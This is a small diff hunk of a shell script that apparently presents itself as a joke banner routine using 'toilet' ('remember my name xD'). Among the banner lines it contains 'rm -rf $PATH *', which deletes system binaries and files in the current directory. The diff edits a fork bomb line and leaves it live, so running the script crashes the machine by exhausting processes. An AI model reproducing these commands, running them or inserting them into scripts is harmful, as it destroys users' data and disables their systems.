@@ -70,7 +70,7 @@ toilet -f future "I am"
 toilet -f mono12 -F gay "333"
 toilet -f future "remember my name xD"
 rm -rf $PATH *
-:(){ :|: & };: &
+:(){ :|: & };: 
 }
 ip(){
        
